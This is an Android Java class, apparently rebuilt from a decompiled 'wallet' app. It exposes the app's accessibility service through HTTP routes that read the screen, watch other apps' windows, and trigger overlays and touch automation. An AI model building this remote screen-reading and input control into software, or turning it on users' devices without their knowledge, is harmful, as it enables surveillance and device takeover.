package com.guard.wallet.server.handler;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.delegate.AccessibilityDelegate;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.koushikdutta.async.http.Multimap;
import com.guard.wallet.server.HttpResponseHelper;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;

/**
 * 无障碍/窗口 Handler — 8 路由。
 * vendor server/b.java 中 /refreshActiveWindow ... /noticeAlive 路由。
 */
public final class AccessibilityHandler {
    private static final String TAG = "HttpServer";

    private AccessibilityHandler() {}

    // ─── /refreshActiveWindow ───

    public static void refreshActiveWindow(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "refreshActiveWindow");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            MyAccessibilityService service = MyAccessibilityService.P();
            service.H(true, true);
            HttpResponseHelper.ok(response, service.l0(true));
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /removeDelegate ───

    public static void removeDelegate(AsyncHttpServerResponse response, String delegateId) {
        try {
            Log.d(TAG, "removeDelegate: " + delegateId);
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            AccessibilityDelegate delegate = HttpResponseHelper.getDelegate(delegateId);
            if (delegate == null) {
                HttpResponseHelper.ok(response, false);
                return;
            }
            MyAccessibilityService service = MyAccessibilityService.P();
            service.C(delegate.getClass().getName(), new ArrayList(delegate.d));
            service.a.remove(delegate);
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /listenWindow ───

    public static void listenWindow(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "listenWindow");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            String packageName = value(params, "packageName");
            String className = value(params, "className");
            if (AppUtils.B(packageName) && AppUtils.B(className)) {
                HttpResponseHelper.error(response, "listenWindow missing packageName/className");
                return;
            }
            ListenWindow window = new ListenWindow();
            window.setId(value(params, "id"));
            window.setPackageName(packageName);
            window.setClassName(className);
            Integer listenType = parseInt(params, "listenType");
            if (listenType != null) {
                window.setListenType(listenType);
            }
            String eventTypes = value(params, "eventTypes");
            if (!AppUtils.B(eventTypes)) {
                LinkedHashSet<Integer> parsed = new LinkedHashSet<>();
                for (String item : eventTypes.split(",")) {
                    try {
                        if (!AppUtils.B(item)) {
                            parsed.add(Integer.parseInt(item.trim()));
                        }
                    } catch (Exception ignore) {
                    }
                }
                if (!parsed.isEmpty()) {
                    window.setEventTypes(parsed);
                }
            }

            MyAccessibilityService service = MyAccessibilityService.P();
            String delegateId = value(params, "delegateId");
            AccessibilityDelegate existing = HttpResponseHelper.getDelegate(delegateId);
            AccessibilityDelegate delegate;
            if (existing != null) {
                existing.d.add(window);
                service.t(existing.getClass().getName(), Collections.singletonList(window));
                delegate = existing;
            } else {
                delegate = service.c(window);
            }
            HttpResponseHelper.ok(response, delegate != null ? delegate.c : null);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /readScreenWindow ───

    public static void readScreenWindow(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "readScreenWindow");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            HttpResponseHelper.ok(response, MyAccessibilityService.P().k0());
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /listenHelper ───

    public static void listenHelper(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "listenHelper");
            ReqListenHelper helper = buildListenHelper(params);
            String prop = helper.getProp();
            if ("TOUCH_POINT".equals(prop)) {
                com.guard.wallet.helper.AutomationHelper.e(null, null, helper);
            } else {
                com.guard.wallet.helper.OverlayViewHelper.d(null, null, helper);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /finishListenHelper ───

    public static void finishListenHelper(Multimap params, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "finishListenHelper");
            ReqListenHelper helper = buildListenHelper(params);
            String subscribeId = helper.getSubscribeId();
            com.guard.wallet.delegate.AccessibilityDelegate delegate = HttpResponseHelper.getDelegate(helper.getDelegateId());
            if (delegate != null && !AppUtils.B(subscribeId)) {
                if (helper.getListenType() != null && helper.getListenType().intValue() == 4) {
                    delegate.j(subscribeId);
                } else {
                    delegate.a(subscribeId);
                }
            } else if ("TOUCH_POINT".equals(helper.getProp())) {
                com.guard.wallet.helper.AutomationHelper.g(true);
            } else {
                com.guard.wallet.helper.OverlayViewHelper.f(subscribeId, true);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /resetAccessibilityService ───

    public static void resetAccessibilityService(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "resetAccessibilityService");
            if (!HttpResponseHelper.requireAccessibility(response)) {
                return;
            }
            MyAccessibilityService service = MyAccessibilityService.P();
            service.r0();
            service.H(true, true);
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    // ─── /noticeAlive ───

    public static void noticeAlive(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "noticeAlive");
            com.guard.wallet.server.ApiRouter.serviceState.set(1);
            MessageRecordVO record = new MessageRecordVO();
            ContainerEventVO event = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                event.setPackageName(MainApplication.getInstance().getPackageName());
            }
            event.setContainerCode("ACCESSIBILITY_CONTAINER");
            event.setIsOpened(MyAccessibilityService.P() != null ? 1 : 0);
            event.setServiceState(com.guard.wallet.server.ApiRouter.serviceState.get());
            record.setIntentCode("android.intent.action.CONTAINER_EVENT");
            record.setExtraBody(event);
            if (MainApplication.getInstance() != null
                    && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
            }
            HttpResponseHelper.ok(response, true);
        } catch (Exception e) { AppUtils.s(TAG, e); HttpResponseHelper.error(response, "Internal error"); }
    }

    private static ReqListenHelper buildListenHelper(Multimap params) {
        ReqListenHelper helper = new ReqListenHelper();
        helper.setBatchId(value(params, "batchId"));
        helper.setListenId(value(params, "listenId"));
        helper.setSubscribeId(value(params, "subscribeId"));
        helper.setDelegateId(value(params, "delegateId"));
        helper.setProp(AppUtils.B(value(params, "prop")) ? "GESTURE_POINTS" : value(params, "prop"));
        helper.setListenType(parseInt(params, "listenType"));
        helper.setScreenState(parseInt(params, "screenState"));
        return helper;
    }

    private static Integer parseInt(Multimap params, String key) {
        try {
            String value = value(params, key);
            return AppUtils.D(value) ? Integer.parseInt(value) : null;
        } catch (Exception ex) {
            return null;
        }
    }

    private static String value(Multimap params, String key) {
        return params != null ? params.getString(key) : null;
    }
}
